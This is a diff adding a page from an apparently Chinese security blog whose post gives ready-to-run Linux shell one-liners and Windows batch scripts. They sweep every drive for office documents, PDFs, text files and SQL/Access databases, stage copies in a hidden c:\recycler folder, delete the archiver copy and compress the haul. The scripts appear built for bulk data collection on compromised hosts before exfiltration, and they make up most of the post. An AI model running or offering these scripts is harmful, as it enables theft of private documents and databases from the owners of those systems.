@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html>
+
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+<title>文件一键打包</title>
+<meta name="description" content="A blog about programming and network security">
+
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="stylesheet" href="/css/my_code.css">
+<!-- below font-awesome.css can not be replaced by local file,error will occur -->
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+
+<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">
+
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/favicons/manifest.json">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
+<!-- <script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script> -->
+
+
+
+
+
+
+
+<!-- add zoom.js --> 
+<link href="/css/zoom.css" rel="stylesheet">
+<script src="/js/jquery-1.11.0.min.js"></script>
+<script src="/js/zoom.js"></script>
+<script src="/js/transition.js"></script>
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p style="font-family: 'Great Vibes', cursive;">quanyechavshuo</p>
+
+
+    
+    <center style="margin-top:180%">
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
+    <br>
+    <br>
+    </center>
+    <p class="links">
+  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
+
+      <h1 class="header" itemprop="name">文件一键打包</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">May 20, 2016</span>
+           under web
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          3 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><h3 id="0x01-linux">0x01 linux</h3>
+
+<p>linux打包命令:
+<a href="https://pan.baidu.com/s/1nvcVqOT">1.sh</a> 密码:0y03<br />
+(attention:without “&amp;&amp; echo ok”,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------content of 1.sh--------------------
+mkdir /tmp/tmp &amp;&amp; find / -name "*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*.xlsx" &gt; /tmp/tmp/xlsx.list &amp;&amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;&amp; echo ok
+--------------------end-----------------------------
+
+--------------------根据时间-------------------
+mkdir /tmp/tmp &amp;&amp; find / -name "*.doc" -mtime -30 &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*.docx" -mtime -30 &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "*.pdf" -mtime -30 &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*.txt" -mtime -30 &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "*.xls" -mtime -30 &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*.xlsx" -mtime -30 &gt; /tmp/tmp/xlsx.list &amp;&amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;&amp; echo ok
+----------------------end----------------------
+(将最近30天内修改过的文件打包)
+
+mysql:
+mkdir /tmp/tmp &amp;&amp; find / -name "*.sql" &gt; /tmp/tmp/tmp.list  &amp;&amp; tar -T /tmp/tmp/tmp.list -czf /tmp/tmp/tmp.tar.gz  &amp;&amp; echo ok
+</code></pre></div></div>
+
+<h3 id="0x02-windows">0x02 windows</h3>
+
+<p>windows打包(rar|7z)命令:<br />
+<a href="https://pan.baidu.com/s/1slMivlb">1.bat</a> 密码:3lwz<br />
+<a href="http://pan.baidu.com/s/1bIyHvo">time_rar.bat</a> 密码:excd (根据不同时间打包文件)<br />
+(attention:7z.exe for x32 need a 7z.dll to performs well while 7z.exe for x64 needn’t)
+(rar.exe does not have the x86 or x64 isssue)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------------content of 1.bat--------------------------
+@echo off
+goto :main
+这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
+dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
+:main
+set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+
+if not exist c:\recycler (
+md c:\recycler
+md c:\recycler\tmp
+        )
+
+if exist c:\recycler (
+rd /s/q c:\recycler\tmp
+md c:\recycler\tmp
+        )
+
+echo  当前硬盘的分区有: 
+for %%i in (%str%) do (
+if exist %%i: (echo %%i:
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.doc"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; tmp.txt
+)
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.docx"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.pdf"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.txt"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.xls"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.xlsx"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+
+)
+)
+
+copy rar.exe c:\recycler\rar.exe
+echo "y" | del rar.exe
+
+c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
+echo ok
+------------------end--------------------------------
+
+or
+c:\recycler\7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*
+
+
+-------------------mysql&amp;access.bat---------------------
+@echo off
+goto :main
+这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
+mdf和ldf文件无法直接复制,需要shadow copy
+dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
+:main
+set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+
+if not exist c:\recycler (
+md c:\recycler
+md c:\recycler\tmp
+        )
+
+if exist c:\recycler (
+rd /s/q c:\recycler\tmp
+md c:\recycler\tmp
+        )
+
+echo  当前硬盘的分区有: 
+for %%i in (%str%) do (
+if exist %%i: (echo %%i:
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.sql"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+for /f "delims=" %%j in ('dir /b /s "%%i:\*.mdb"') do (
+echo "yes" | copy "%%j" c:\recycler\tmp
+echo %%j &gt;&gt; c:\recycler\tmp\tmp.txt
+)
+
+)
+)
+
+copy rar.exe c:\recycler\rar.exe
+echo "y" | del rar.exe
+
+c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
+echo ok
+---------------------end-------------------------
+
+
+附加命令
+----------------------update----------------------
+windows找文件命令:
+for /f %j in ('dir /b /s "c:\MSCOMCTL.O?X"') do (echo %j)
+windows找文件中的字符串命令:
+findstr /R ".*sa.*" c:\1\* &gt; tmp.txt
+----------------------end-------------------------
+</code></pre></div></div>
+
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            windows, dir /s, sh, 7z, tar
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+
+
+<!-- 个人增加织网背景效果 -->
+<!--
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+-->
+
+
+      
+
+
+
+      
+
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-12">
+		  <!--for better experience please install font 文泉驿等宽正黑-->
+Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
+	<SCRIPT language=javascript> 
+	<!-- 
+	function show_date_time(){ 
+		window.setTimeout("show_date_time()", 1000); 
+		BirthDay=new Date("3/7/2016 20:00:00");
+		today=new Date(); 
+		timeold=(today.getTime() - BirthDay.getTime()); 
+		sectimeold=timeold/1000 
+		secondsold=Math.floor(sectimeold); 
+		msPerDay=24*60*60*1000 
+		e_daysold=timeold/msPerDay 
+		daysold=Math.floor(e_daysold); 
+		e_hrsold=(e_daysold-daysold)*24; 
+		hrsold=Math.floor(e_hrsold); 
+		e_minsold=(e_hrsold-hrsold)*60; 
+		minsold=Math.floor((e_hrsold-hrsold)*60); 
+		seconds=Math.floor((e_minsold-minsold)*60); 
+		//times = document.getElementById("times");
+		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
+	} 
+	show_date_time(); 
+	//--> 
+	</SCRIPT>
+  </div>
+</div>
+
+<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
+<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
+<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
+<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
+<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>
+
+
+<script src="/js/jquery-1.11.0.min.js"></script>
+<!--
+<script src="/js/bootstrap.min.js"></script>
+-->
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+<!--
+<script type="text/javascript"> 
+$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
+$youziku.draw(); 
+</script>
+-->
+
+
+    </body>
+</html>
